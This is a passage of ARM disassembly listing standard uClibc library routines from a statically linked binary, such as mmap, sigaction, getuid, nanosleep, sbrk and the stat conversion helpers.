   1a660:	e1530004 	cmp	r3, r4
   1a664:	1a000005 	bne	1a680 <__uClibc_main+0x350>
   1a668:	e1a00004 	mov	r0, r4
   1a66c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1a670:	e1a0e00f 	mov	lr, pc
   1a674:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1a678:	3afffff7 	bcc	1a65c <__uClibc_main+0x32c>
   1a67c:	e1a03004 	mov	r3, r4
   1a680:	e1530004 	cmp	r3, r4
   1a684:	1afffff0 	bne	1a64c <__uClibc_main+0x31c>
   1a688:	e3530001 	cmp	r3, #1
   1a68c:	0a00000c 	beq	1a6c4 <__uClibc_main+0x394>
   1a690:	e3a00000 	mov	r0, #0
   1a694:	e3a07001 	mov	r7, #1
   1a698:	ef000000 	svc	0x00000000
   1a69c:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a6a0:	e1a02000 	mov	r2, r0
   1a6a4:	9a000006 	bls	1a6c4 <__uClibc_main+0x394>
   1a6a8:	e59f3068 	ldr	r3, [pc, #104]	; 1a718 <__uClibc_main+0x3e8>
   1a6ac:	eb00006f 	bl	1a870 <__aeabi_read_tp>
   1a6b0:	e79f3003 	ldr	r3, [pc, r3]
   1a6b4:	e2622000 	rsb	r2, r2, #0
   1a6b8:	e3a01000 	mov	r1, #0
   1a6bc:	e7802003 	str	r2, [r0, r3]
   1a6c0:	ea000000 	b	1a6c8 <__uClibc_main+0x398>
   1a6c4:	e3a01000 	mov	r1, #0
   1a6c8:	e1a00001 	mov	r0, r1
   1a6cc:	ebfffa12 	bl	18f1c <__GI_exit>
   1a6d0:	0000e644 	.word	0x0000e644
   1a6d4:	00000018 	.word	0x00000018
   1a6d8:	00000038 	.word	0x00000038
   1a6dc:	000009b4 	.word	0x000009b4
   1a6e0:	00000094 	.word	0x00000094
   1a6e4:	00008002 	.word	0x00008002
   1a6e8:	000001dc 	.word	0x000001dc
   1a6ec:	000000a4 	.word	0x000000a4
   1a6f0:	00000060 	.word	0x00000060
   1a6f4:	fffffff4 	.word	0xfffffff4
   1a6f8:	fffffff4 	.word	0xfffffff4
   1a6fc:	000009b0 	.word	0x000009b0
   1a700:	fffffff4 	.word	0xfffffff4
   1a704:	fffffff8 	.word	0xfffffff8
   1a708:	fffedec4 	.word	0xfffedec4
   1a70c:	00000080 	.word	0x00000080
   1a710:	00000028 	.word	0x00000028
   1a714:	00000078 	.word	0x00000078
   1a718:	0000e334 	.word	0x0000e334

0001a71c <__GI_mmap>:
   1a71c:	e92d40b0 	push	{r4, r5, r7, lr}
   1a720:	e59d5014 	ldr	r5, [sp, #20]
   1a724:	e1a0ca05 	lsl	ip, r5, #20
   1a728:	e1a0ca2c 	lsr	ip, ip, #20
   1a72c:	e35c0000 	cmp	ip, #0
   1a730:	0a000006 	beq	1a750 <__GI_mmap+0x34>
   1a734:	e59f2054 	ldr	r2, [pc, #84]	; 1a790 <__GI_mmap+0x74>
   1a738:	eb00004c 	bl	1a870 <__aeabi_read_tp>
   1a73c:	e79f2002 	ldr	r2, [pc, r2]
   1a740:	e3a03016 	mov	r3, #22
   1a744:	e3e01000 	mvn	r1, #0
   1a748:	e7803002 	str	r3, [r0, r2]
   1a74c:	ea00000c 	b	1a784 <__GI_mmap+0x68>
   1a750:	e59d4010 	ldr	r4, [sp, #16]
   1a754:	e1a05625 	lsr	r5, r5, #12
   1a758:	e3a070c0 	mov	r7, #192	; 0xc0
   1a75c:	ef000000 	svc	0x00000000
   1a760:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a764:	9a000005 	bls	1a780 <__GI_mmap+0x64>
   1a768:	e59f3024 	ldr	r3, [pc, #36]	; 1a794 <__GI_mmap+0x78>
   1a76c:	e2602000 	rsb	r2, r0, #0
   1a770:	e79f3003 	ldr	r3, [pc, r3]
   1a774:	eb00003d 	bl	1a870 <__aeabi_read_tp>
   1a778:	e7802003 	str	r2, [r0, r3]
   1a77c:	e3e00000 	mvn	r0, #0
   1a780:	e1a01000 	mov	r1, r0
   1a784:	e1a00001 	mov	r0, r1
   1a788:	e8bd40b0 	pop	{r4, r5, r7, lr}
   1a78c:	e12fff1e 	bx	lr
   1a790:	0000e2a8 	.word	0x0000e2a8
   1a794:	0000e274 	.word	0x0000e274

0001a798 <__syscall_error>:
   1a798:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1a79c:	e59f201c 	ldr	r2, [pc, #28]	; 1a7c0 <__syscall_error+0x28>
   1a7a0:	e1a03000 	mov	r3, r0
   1a7a4:	e79f2002 	ldr	r2, [pc, r2]
   1a7a8:	eb000030 	bl	1a870 <__aeabi_read_tp>
   1a7ac:	e2633000 	rsb	r3, r3, #0
   1a7b0:	e7803002 	str	r3, [r0, r2]
   1a7b4:	e3e00000 	mvn	r0, #0
   1a7b8:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1a7bc:	e12fff1e 	bx	lr
   1a7c0:	0000e240 	.word	0x0000e240

0001a7c4 <__libc_sigaction>:
   1a7c4:	e92d4070 	push	{r4, r5, r6, lr}
   1a7c8:	e59f4070 	ldr	r4, [pc, #112]	; 1a840 <__libc_sigaction+0x7c>
   1a7cc:	e251c000 	subs	ip, r1, #0
   1a7d0:	e08f4004 	add	r4, pc, r4
   1a7d4:	e24dd018 	sub	sp, sp, #24
   1a7d8:	e1a05000 	mov	r5, r0
   1a7dc:	e1a06002 	mov	r6, r2
   1a7e0:	0a00000e 	beq	1a820 <__libc_sigaction+0x5c>
   1a7e4:	e59c3004 	ldr	r3, [ip, #4]
   1a7e8:	e3130301 	tst	r3, #67108864	; 0x4000000
   1a7ec:	1a00000b 	bne	1a820 <__libc_sigaction+0x5c>
   1a7f0:	e3a02014 	mov	r2, #20
   1a7f4:	e28d0004 	add	r0, sp, #4
   1a7f8:	ebfff02c 	bl	168b0 <__GI_memcpy>
   1a7fc:	e59d2008 	ldr	r2, [sp, #8]
   1a800:	e3120004 	tst	r2, #4
   1a804:	159f3038 	ldrne	r3, [pc, #56]	; 1a844 <__libc_sigaction+0x80>
   1a808:	059f3038 	ldreq	r3, [pc, #56]	; 1a848 <__libc_sigaction+0x84>
   1a80c:	e7941003 	ldr	r1, [r4, r3]
   1a810:	e3823301 	orr	r3, r2, #67108864	; 0x4000000
   1a814:	e58d100c 	str	r1, [sp, #12]
   1a818:	e58d3008 	str	r3, [sp, #8]
   1a81c:	e28dc004 	add	ip, sp, #4
   1a820:	e1a00005 	mov	r0, r5
   1a824:	e1a0100c 	mov	r1, ip
   1a828:	e1a02006 	mov	r2, r6
   1a82c:	e3a03008 	mov	r3, #8
   1a830:	eb000012 	bl	1a880 <__syscall_rt_sigaction>
   1a834:	e28dd018 	add	sp, sp, #24
   1a838:	e8bd4070 	pop	{r4, r5, r6, lr}
   1a83c:	e12fff1e 	bx	lr
   1a840:	0000e1bc 	.word	0x0000e1bc
   1a844:	00000088 	.word	0x00000088
   1a848:	0000007c 	.word	0x0000007c

0001a84c <_setjmp>:
   1a84c:	e3a01000 	mov	r1, #0
   1a850:	ea000b33 	b	1d524 <__sigsetjmp>
   1a854:	e1a00000 	nop			; (mov r0, r0)

0001a858 <__default_sa_restorer>:
   1a858:	e3a07077 	mov	r7, #119	; 0x77
   1a85c:	ef000000 	svc	0x00000000
   1a860:	e1a00000 	nop			; (mov r0, r0)

0001a864 <__default_rt_sa_restorer>:
   1a864:	e3a070ad 	mov	r7, #173	; 0xad
   1a868:	ef000000 	svc	0x00000000
   1a86c:	00000000 	andeq	r0, r0, r0

0001a870 <__aeabi_read_tp>:
   1a870:	e3e00a0f 	mvn	r0, #61440	; 0xf000
   1a874:	e240f01f 	sub	pc, r0, #31
   1a878:	e1a00000 	nop			; (mov r0, r0)
   1a87c:	e1a00000 	nop			; (mov r0, r0)

0001a880 <__syscall_rt_sigaction>:
   1a880:	e92d4080 	push	{r7, lr}
   1a884:	e3a070ae 	mov	r7, #174	; 0xae
   1a888:	ef000000 	svc	0x00000000
   1a88c:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a890:	e1a02000 	mov	r2, r0
   1a894:	91a00000 	movls	r0, r0
   1a898:	9a000005 	bls	1a8b4 <__syscall_rt_sigaction+0x34>
   1a89c:	e59f3018 	ldr	r3, [pc, #24]	; 1a8bc <__syscall_rt_sigaction+0x3c>
   1a8a0:	ebfffff2 	bl	1a870 <__aeabi_read_tp>
   1a8a4:	e79f3003 	ldr	r3, [pc, r3]
   1a8a8:	e2622000 	rsb	r2, r2, #0
   1a8ac:	e7802003 	str	r2, [r0, r3]
   1a8b0:	e3e00000 	mvn	r0, #0
   1a8b4:	e8bd4080 	pop	{r7, lr}
   1a8b8:	e12fff1e 	bx	lr
   1a8bc:	0000e140 	.word	0x0000e140

0001a8c0 <__GI__exit>:
   1a8c0:	e59f5058 	ldr	r5, [pc, #88]	; 1a920 <__GI__exit+0x60>
   1a8c4:	e59f4058 	ldr	r4, [pc, #88]	; 1a924 <__GI__exit+0x64>
   1a8c8:	e1a01000 	mov	r1, r0
   1a8cc:	e1a00001 	mov	r0, r1
   1a8d0:	e3a070f8 	mov	r7, #248	; 0xf8
   1a8d4:	ef000000 	svc	0x00000000
   1a8d8:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a8dc:	e1a02000 	mov	r2, r0
   1a8e0:	e3a07001 	mov	r7, #1
   1a8e4:	9a000003 	bls	1a8f8 <__GI__exit+0x38>
   1a8e8:	ebffffe0 	bl	1a870 <__aeabi_read_tp>
   1a8ec:	e2622000 	rsb	r2, r2, #0
   1a8f0:	e79f3005 	ldr	r3, [pc, r5]
   1a8f4:	e7802003 	str	r2, [r0, r3]
   1a8f8:	e1a00001 	mov	r0, r1
   1a8fc:	ef000000 	svc	0x00000000
   1a900:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a904:	e1a02000 	mov	r2, r0
   1a908:	9affffef 	bls	1a8cc <__GI__exit+0xc>
   1a90c:	ebffffd7 	bl	1a870 <__aeabi_read_tp>
   1a910:	e2622000 	rsb	r2, r2, #0
   1a914:	e79f3004 	ldr	r3, [pc, r4]
   1a918:	e7802003 	str	r2, [r0, r3]
   1a91c:	eaffffea 	b	1a8cc <__GI__exit+0xc>
   1a920:	0000e0f4 	.word	0x0000e0f4
   1a924:	0000e0d0 	.word	0x0000e0d0

0001a928 <__GI_fstat>:
   1a928:	e92d4080 	push	{r7, lr}
   1a92c:	e24dd068 	sub	sp, sp, #104	; 0x68
   1a930:	e1a03001 	mov	r3, r1
   1a934:	e3a070c5 	mov	r7, #197	; 0xc5
   1a938:	e1a0100d 	mov	r1, sp
   1a93c:	ef000000 	svc	0x00000000
   1a940:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a944:	e1a02000 	mov	r2, r0
   1a948:	9a000006 	bls	1a968 <__GI_fstat+0x40>
   1a94c:	e59f3034 	ldr	r3, [pc, #52]	; 1a988 <__GI_fstat+0x60>
   1a950:	ebffffc6 	bl	1a870 <__aeabi_read_tp>
   1a954:	e79f3003 	ldr	r3, [pc, r3]
   1a958:	e2622000 	rsb	r2, r2, #0
   1a95c:	e3e07000 	mvn	r7, #0
   1a960:	e7802003 	str	r2, [r0, r3]
   1a964:	ea000003 	b	1a978 <__GI_fstat+0x50>
   1a968:	e2507000 	subs	r7, r0, #0
   1a96c:	01a0000d 	moveq	r0, sp
   1a970:	01a01003 	moveq	r1, r3
   1a974:	0b00010f 	bleq	1adb8 <__xstat32_conv>
   1a978:	e1a00007 	mov	r0, r7
   1a97c:	e28dd068 	add	sp, sp, #104	; 0x68
   1a980:	e8bd4080 	pop	{r7, lr}
   1a984:	e12fff1e 	bx	lr
   1a988:	0000e090 	.word	0x0000e090

0001a98c <__getdents>:
   1a98c:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1a990:	e3a0708d 	mov	r7, #141	; 0x8d
   1a994:	e24dd004 	sub	sp, sp, #4
   1a998:	ef000000 	svc	0x00000000
   1a99c:	e3700a01 	cmn	r0, #4096	; 0x1000
   1a9a0:	e1a05000 	mov	r5, r0
   1a9a4:	9a000006 	bls	1a9c4 <__getdents+0x38>
   1a9a8:	e59f3078 	ldr	r3, [pc, #120]	; 1aa28 <__getdents+0x9c>
   1a9ac:	e2602000 	rsb	r2, r0, #0
   1a9b0:	e79f3003 	ldr	r3, [pc, r3]
   1a9b4:	ebffffad 	bl	1a870 <__aeabi_read_tp>
   1a9b8:	e3e05000 	mvn	r5, #0
   1a9bc:	e7802003 	str	r2, [r0, r3]
   1a9c0:	ea000014 	b	1aa18 <__getdents+0x8c>
   1a9c4:	e3700001 	cmn	r0, #1
   1a9c8:	11a07001 	movne	r7, r1
   1a9cc:	1087a000 	addne	sl, r7, r0
   1a9d0:	1a00000b 	bne	1aa04 <__getdents+0x78>
   1a9d4:	ea00000f 	b	1aa18 <__getdents+0x8c>
   1a9d8:	e1d730b8 	ldrh	r3, [r7, #8]
   1a9dc:	e0873003 	add	r3, r7, r3
   1a9e0:	e5534001 	ldrb	r4, [r3, #-1]
   1a9e4:	ebffefe1 	bl	16970 <__GI_strlen>
   1a9e8:	e1a01006 	mov	r1, r6
   1a9ec:	e2802001 	add	r2, r0, #1
   1a9f0:	e1a00008 	mov	r0, r8
   1a9f4:	ebffefb1 	bl	168c0 <__GI_memmove>
   1a9f8:	e1d730b8 	ldrh	r3, [r7, #8]
   1a9fc:	e5c7400a 	strb	r4, [r7, #10]
   1aa00:	e0877003 	add	r7, r7, r3
   1aa04:	e287600a 	add	r6, r7, #10
   1aa08:	e157000a 	cmp	r7, sl
   1aa0c:	e1a00006 	mov	r0, r6
   1aa10:	e287800b 	add	r8, r7, #11
   1aa14:	3affffef 	bcc	1a9d8 <__getdents+0x4c>
   1aa18:	e1a00005 	mov	r0, r5
   1aa1c:	e28dd004 	add	sp, sp, #4
   1aa20:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   1aa24:	e12fff1e 	bx	lr
   1aa28:	0000e034 	.word	0x0000e034

0001aa2c <__GI_getdtablesize>:
   1aa2c:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1aa30:	e24dd00c 	sub	sp, sp, #12
   1aa34:	e1a0100d 	mov	r1, sp
   1aa38:	e3a00007 	mov	r0, #7
   1aa3c:	eb00001e 	bl	1aabc <__GI_getrlimit>
   1aa40:	e3500000 	cmp	r0, #0
   1aa44:	a59d0000 	ldrge	r0, [sp]
   1aa48:	b3a00c01 	movlt	r0, #256	; 0x100
   1aa4c:	e28dd00c 	add	sp, sp, #12
   1aa50:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1aa54:	e12fff1e 	bx	lr

0001aa58 <__GI_getegid>:
   1aa58:	e52d7004 	push	{r7}		; (str r7, [sp, #-4]!)
   1aa5c:	e3a070ca 	mov	r7, #202	; 0xca
   1aa60:	ef000000 	svc	0x00000000
   1aa64:	e8bd0080 	ldmfd	sp!, {r7}
   1aa68:	e12fff1e 	bx	lr

0001aa6c <__GI_geteuid>:
   1aa6c:	e52d7004 	push	{r7}		; (str r7, [sp, #-4]!)
   1aa70:	e3a070c9 	mov	r7, #201	; 0xc9
   1aa74:	ef000000 	svc	0x00000000
   1aa78:	e8bd0080 	ldmfd	sp!, {r7}
   1aa7c:	e12fff1e 	bx	lr

0001aa80 <__GI_getgid>:
   1aa80:	e52d7004 	push	{r7}		; (str r7, [sp, #-4]!)
   1aa84:	e3a070c8 	mov	r7, #200	; 0xc8
   1aa88:	ef000000 	svc	0x00000000
   1aa8c:	e8bd0080 	ldmfd	sp!, {r7}
   1aa90:	e12fff1e 	bx	lr

0001aa94 <__GI_getpagesize>:
   1aa94:	e59f3018 	ldr	r3, [pc, #24]	; 1aab4 <__GI_getpagesize+0x20>
   1aa98:	e59f2018 	ldr	r2, [pc, #24]	; 1aab8 <__GI_getpagesize+0x24>
   1aa9c:	e08f3003 	add	r3, pc, r3
   1aaa0:	e7932002 	ldr	r2, [r3, r2]
   1aaa4:	e5920000 	ldr	r0, [r2]
   1aaa8:	e3500000 	cmp	r0, #0
   1aaac:	03a00a01 	moveq	r0, #4096	; 0x1000
   1aab0:	e12fff1e 	bx	lr
   1aab4:	0000def0 	.word	0x0000def0
   1aab8:	00000094 	.word	0x00000094

0001aabc <__GI_getrlimit>:
   1aabc:	e92d4080 	push	{r7, lr}
   1aac0:	e3a070bf 	mov	r7, #191	; 0xbf
   1aac4:	ef000000 	svc	0x00000000
   1aac8:	e3700a01 	cmn	r0, #4096	; 0x1000
   1aacc:	9a000005 	bls	1aae8 <__GI_getrlimit+0x2c>
   1aad0:	e59f3018 	ldr	r3, [pc, #24]	; 1aaf0 <__GI_getrlimit+0x34>
   1aad4:	e2602000 	rsb	r2, r0, #0
   1aad8:	e79f3003 	ldr	r3, [pc, r3]
   1aadc:	ebffff63 	bl	1a870 <__aeabi_read_tp>
   1aae0:	e7802003 	str	r2, [r0, r3]
   1aae4:	e3e00000 	mvn	r0, #0
   1aae8:	e8bd4080 	pop	{r7, lr}
   1aaec:	e12fff1e 	bx	lr
   1aaf0:	0000df0c 	.word	0x0000df0c

0001aaf4 <__GI_gettimeofday>:
   1aaf4:	e92d4080 	push	{r7, lr}
   1aaf8:	e3a0704e 	mov	r7, #78	; 0x4e
   1aafc:	ef000000 	svc	0x00000000
   1ab00:	e3700a01 	cmn	r0, #4096	; 0x1000
   1ab04:	e1a02000 	mov	r2, r0
   1ab08:	91a00000 	movls	r0, r0
   1ab0c:	9a000005 	bls	1ab28 <__GI_gettimeofday+0x34>
   1ab10:	e59f3018 	ldr	r3, [pc, #24]	; 1ab30 <__GI_gettimeofday+0x3c>
   1ab14:	ebffff55 	bl	1a870 <__aeabi_read_tp>
   1ab18:	e79f3003 	ldr	r3, [pc, r3]
   1ab1c:	e2622000 	rsb	r2, r2, #0
   1ab20:	e7802003 	str	r2, [r0, r3]
   1ab24:	e3e00000 	mvn	r0, #0
   1ab28:	e8bd4080 	pop	{r7, lr}
   1ab2c:	e12fff1e 	bx	lr
   1ab30:	0000decc 	.word	0x0000decc

0001ab34 <__GI_getuid>:
   1ab34:	e52d7004 	push	{r7}		; (str r7, [sp, #-4]!)
   1ab38:	e3a070c7 	mov	r7, #199	; 0xc7
   1ab3c:	ef000000 	svc	0x00000000
   1ab40:	e8bd0080 	ldmfd	sp!, {r7}
   1ab44:	e12fff1e 	bx	lr

0001ab48 <__GI_mremap>:
   1ab48:	e92d4090 	push	{r4, r7, lr}
   1ab4c:	e59d400c 	ldr	r4, [sp, #12]
   1ab50:	e3a070a3 	mov	r7, #163	; 0xa3
   1ab54:	ef000000 	svc	0x00000000
   1ab58:	e3700a01 	cmn	r0, #4096	; 0x1000
   1ab5c:	e1a02000 	mov	r2, r0
   1ab60:	91a00000 	movls	r0, r0
   1ab64:	9a000005 	bls	1ab80 <__GI_mremap+0x38>
   1ab68:	e59f3018 	ldr	r3, [pc, #24]	; 1ab88 <__GI_mremap+0x40>
   1ab6c:	ebffff3f 	bl	1a870 <__aeabi_read_tp>
   1ab70:	e79f3003 	ldr	r3, [pc, r3]
   1ab74:	e2622000 	rsb	r2, r2, #0
   1ab78:	e7802003 	str	r2, [r0, r3]
   1ab7c:	e3e00000 	mvn	r0, #0
   1ab80:	e8bd4090 	pop	{r4, r7, lr}
   1ab84:	e12fff1e 	bx	lr
   1ab88:	0000de74 	.word	0x0000de74

0001ab8c <__GI_munmap>:
   1ab8c:	e92d4080 	push	{r7, lr}
   1ab90:	e3a0705b 	mov	r7, #91	; 0x5b
   1ab94:	ef000000 	svc	0x00000000
   1ab98:	e3700a01 	cmn	r0, #4096	; 0x1000
   1ab9c:	e1a02000 	mov	r2, r0
   1aba0:	91a00000 	movls	r0, r0
   1aba4:	9a000005 	bls	1abc0 <__GI_munmap+0x34>
   1aba8:	e59f3018 	ldr	r3, [pc, #24]	; 1abc8 <__GI_munmap+0x3c>
   1abac:	ebffff2f 	bl	1a870 <__aeabi_read_tp>
   1abb0:	e79f3003 	ldr	r3, [pc, r3]
   1abb4:	e2622000 	rsb	r2, r2, #0
   1abb8:	e7802003 	str	r2, [r0, r3]
   1abbc:	e3e00000 	mvn	r0, #0
   1abc0:	e8bd4080 	pop	{r7, lr}
   1abc4:	e12fff1e 	bx	lr
   1abc8:	0000de34 	.word	0x0000de34

0001abcc <__syscall_nanosleep>:
   1abcc:	e92d4080 	push	{r7, lr}
   1abd0:	e3a070a2 	mov	r7, #162	; 0xa2
   1abd4:	ef000000 	svc	0x00000000
   1abd8:	e3700a01 	cmn	r0, #4096	; 0x1000
   1abdc:	e1a02000 	mov	r2, r0
   1abe0:	91a00000 	movls	r0, r0
   1abe4:	9a000005 	bls	1ac00 <__syscall_nanosleep+0x34>
   1abe8:	e59f3018 	ldr	r3, [pc, #24]	; 1ac08 <__syscall_nanosleep+0x3c>
   1abec:	ebffff1f 	bl	1a870 <__aeabi_read_tp>
   1abf0:	e79f3003 	ldr	r3, [pc, r3]
   1abf4:	e2622000 	rsb	r2, r2, #0
   1abf8:	e7802003 	str	r2, [r0, r3]
   1abfc:	e3e00000 	mvn	r0, #0
   1ac00:	e8bd4080 	pop	{r7, lr}
   1ac04:	e12fff1e 	bx	lr
   1ac08:	0000ddf4 	.word	0x0000ddf4

0001ac0c <__libc_nanosleep>:
   1ac0c:	e59f3050 	ldr	r3, [pc, #80]	; 1ac64 <__libc_nanosleep+0x58>
   1ac10:	e59f2050 	ldr	r2, [pc, #80]	; 1ac68 <__libc_nanosleep+0x5c>
   1ac14:	e08f3003 	add	r3, pc, r3
   1ac18:	e7932002 	ldr	r2, [r3, r2]
   1ac1c:	e3520000 	cmp	r2, #0
   1ac20:	e92d4070 	push	{r4, r5, r6, lr}
   1ac24:	e1a04000 	mov	r4, r0
   1ac28:	e1a06001 	mov	r6, r1
   1ac2c:	1a000001 	bne	1ac38 <__libc_nanosleep+0x2c>
   1ac30:	e8bd4070 	pop	{r4, r5, r6, lr}
   1ac34:	eaffffe4 	b	1abcc <__syscall_nanosleep>
   1ac38:	ebfffd2a 	bl	1a0e8 <__libc_enable_asynccancel>
   1ac3c:	e1a01006 	mov	r1, r6
   1ac40:	e1a05000 	mov	r5, r0
   1ac44:	e1a00004 	mov	r0, r4
   1ac48:	ebffffdf 	bl	1abcc <__syscall_nanosleep>
   1ac4c:	e1a04000 	mov	r4, r0
   1ac50:	e1a00005 	mov	r0, r5
   1ac54:	ebfffd01 	bl	1a060 <__libc_disable_asynccancel>
   1ac58:	e1a00004 	mov	r0, r4
   1ac5c:	e8bd4070 	pop	{r4, r5, r6, lr}
   1ac60:	e12fff1e 	bx	lr
   1ac64:	0000dd78 	.word	0x0000dd78
   1ac68:	0000356c 	.word	0x0000356c

0001ac6c <__GI_sbrk>:
   1ac6c:	e92d4070 	push	{r4, r5, r6, lr}
   1ac70:	e59f4058 	ldr	r4, [pc, #88]	; 1acd0 <__GI_sbrk+0x64>
   1ac74:	e59f6058 	ldr	r6, [pc, #88]	; 1acd4 <__GI_sbrk+0x68>
   1ac78:	e08f4004 	add	r4, pc, r4
   1ac7c:	e7943006 	ldr	r3, [r4, r6]
   1ac80:	e3530000 	cmp	r3, #0
   1ac84:	e1a05000 	mov	r5, r0
   1ac88:	1a000003 	bne	1ac9c <__GI_sbrk+0x30>
   1ac8c:	e1a00003 	mov	r0, r3
   1ac90:	eb000a0d 	bl	1d4cc <__GI_brk>
   1ac94:	e3500000 	cmp	r0, #0
   1ac98:	ba000008 	blt	1acc0 <__GI_sbrk+0x54>
   1ac9c:	e7940006 	ldr	r0, [r4, r6]
   1aca0:	e3550000 	cmp	r5, #0
   1aca4:	01a04000 	moveq	r4, r0
   1aca8:	0a000005 	beq	1acc4 <__GI_sbrk+0x58>
   1acac:	e1a04000 	mov	r4, r0
   1acb0:	e0800005 	add	r0, r0, r5
   1acb4:	eb000a04 	bl	1d4cc <__GI_brk>
   1acb8:	e3500000 	cmp	r0, #0
   1acbc:	aa000000 	bge	1acc4 <__GI_sbrk+0x58>
   1acc0:	e3e04000 	mvn	r4, #0
   1acc4:	e1a00004 	mov	r0, r4
   1acc8:	e8bd4070 	pop	{r4, r5, r6, lr}
   1accc:	e12fff1e 	bx	lr
   1acd0:	0000dd14 	.word	0x0000dd14
   1acd4:	00002f14 	.word	0x00002f14

0001acd8 <__GI_times>:
   1acd8:	e52d7004 	push	{r7}		; (str r7, [sp, #-4]!)
   1acdc:	e3a0702b 	mov	r7, #43	; 0x2b
   1ace0:	ef000000 	svc	0x00000000
   1ace4:	e8bd0080 	ldmfd	sp!, {r7}
   1ace8:	e12fff1e 	bx	lr

0001acec <__xstat64_conv>:
   1acec:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   1acf0:	e1a05001 	mov	r5, r1
   1acf4:	e1a06000 	mov	r6, r0
   1acf8:	e3a01000 	mov	r1, #0
   1acfc:	e3a02068 	mov	r2, #104	; 0x68
   1ad00:	e1a00005 	mov	r0, r5
   1ad04:	ebffeef1 	bl	168d0 <__GI_memset>
   1ad08:	e8960018 	ldm	r6, {r3, r4}
   1ad0c:	e8850018 	stm	r5, {r3, r4}
   1ad10:	e596300c 	ldr	r3, [r6, #12]
   1ad14:	e585300c 	str	r3, [r5, #12]
   1ad18:	e2863060 	add	r3, r6, #96	; 0x60
   1ad1c:	e8930018 	ldm	r3, {r3, r4}
   1ad20:	e5962038 	ldr	r2, [r6, #56]	; 0x38
   1ad24:	e5853060 	str	r3, [r5, #96]	; 0x60
   1ad28:	e5854064 	str	r4, [r5, #100]	; 0x64
   1ad2c:	e286c018 	add	ip, r6, #24
   1ad30:	e89c5000 	ldm	ip, {ip, lr}
   1ad34:	e5852038 	str	r2, [r5, #56]	; 0x38
   1ad38:	e2863048 	add	r3, r6, #72	; 0x48
   1ad3c:	e2867020 	add	r7, r6, #32
   1ad40:	e8970180 	ldm	r7, {r7, r8}
   1ad44:	e8930003 	ldm	r3, {r0, r1}
   1ad48:	e2853048 	add	r3, r5, #72	; 0x48
   1ad4c:	e8830003 	stm	r3, {r0, r1}
   1ad50:	e5857020 	str	r7, [r5, #32]
   1ad54:	e5858024 	str	r8, [r5, #36]	; 0x24
   1ad58:	e2863050 	add	r3, r6, #80	; 0x50
   1ad5c:	e2867030 	add	r7, r6, #48	; 0x30
   1ad60:	e8970180 	ldm	r7, {r7, r8}
   1ad64:	e8930003 	ldm	r3, {r0, r1}
   1ad68:	e5962010 	ldr	r2, [r6, #16]
   1ad6c:	e2853050 	add	r3, r5, #80	; 0x50
   1ad70:	e8830003 	stm	r3, {r0, r1}
   1ad74:	e5857030 	str	r7, [r5, #48]	; 0x30
   1ad78:	e5858034 	str	r8, [r5, #52]	; 0x34
   1ad7c:	e5852010 	str	r2, [r5, #16]
   1ad80:	e2863058 	add	r3, r6, #88	; 0x58
   1ad84:	e5962014 	ldr	r2, [r6, #20]
   1ad88:	e8930003 	ldm	r3, {r0, r1}
   1ad8c:	e2866040 	add	r6, r6, #64	; 0x40
   1ad90:	e89600c0 	ldm	r6, {r6, r7}
   1ad94:	e2853058 	add	r3, r5, #88	; 0x58
   1ad98:	e5852014 	str	r2, [r5, #20]
   1ad9c:	e585c018 	str	ip, [r5, #24]
   1ada0:	e585e01c 	str	lr, [r5, #28]
   1ada4:	e5856040 	str	r6, [r5, #64]	; 0x40
   1ada8:	e5857044 	str	r7, [r5, #68]	; 0x44
   1adac:	e8830003 	stm	r3, {r0, r1}
   1adb0:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   1adb4:	e12fff1e 	bx	lr

0001adb8 <__xstat32_conv>:
   1adb8:	e92d4070 	push	{r4, r5, r6, lr}
   1adbc:	e1a06001 	mov	r6, r1
   1adc0:	e1a05000 	mov	r5, r0
   1adc4:	e3a01000 	mov	r1, #0
   1adc8:	e3a02058 	mov	r2, #88	; 0x58
   1adcc:	e1a00006 	mov	r0, r6
   1add0:	ebffeebe 	bl	168d0 <__GI_memset>
   1add4:	e8950018 	ldm	r5, {r3, r4}
   1add8:	e8860018 	stm	r6, {r3, r4}
   1addc:	e2853020 	add	r3, r5, #32
   1ade0:	e8930018 	ldm	r3, {r3, r4}
   1ade4:	e5952060 	ldr	r2, [r5, #96]	; 0x60
   1ade8:	e5863020 	str	r3, [r6, #32]
   1adec:	e5864024 	str	r4, [r6, #36]	; 0x24
   1adf0:	e586200c 	str	r2, [r6, #12]
   1adf4:	e5953030 	ldr	r3, [r5, #48]	; 0x30
   1adf8:	e285c018 	add	ip, r5, #24
   1adfc:	e89c5000 	ldm	ip, {ip, lr}
   1ae00:	e586302c 	str	r3, [r6, #44]	; 0x2c
   1ae04:	e5953040 	ldr	r3, [r5, #64]	; 0x40
   1ae08:	e5952038 	ldr	r2, [r5, #56]	; 0x38
   1ae0c:	e5863034 	str	r3, [r6, #52]	; 0x34
   1ae10:	e5862030 	str	r2, [r6, #48]	; 0x30
   1ae14:	e2853048 	add	r3, r5, #72	; 0x48
   1ae18:	e8930003 	ldm	r3, {r0, r1}
   1ae1c:	e2863038 	add	r3, r6, #56	; 0x38
   1ae20:	e8830003 	stm	r3, {r0, r1}
   1ae24:	e2853050 	add	r3, r5, #80	; 0x50
   1ae28:	e8930003 	ldm	r3, {r0, r1}
   1ae2c:	e2863040 	add	r3, r6, #64	; 0x40
   1ae30:	e8830003 	stm	r3, {r0, r1}
   1ae34:	e5953010 	ldr	r3, [r5, #16]
   1ae38:	e5863010 	str	r3, [r6, #16]
   1ae3c:	e2853058 	add	r3, r5, #88	; 0x58
   1ae40:	e5952014 	ldr	r2, [r5, #20]
   1ae44:	e8930003 	ldm	r3, {r0, r1}
   1ae48:	e2863048 	add	r3, r6, #72	; 0x48
   1ae4c:	e8830003 	stm	r3, {r0, r1}
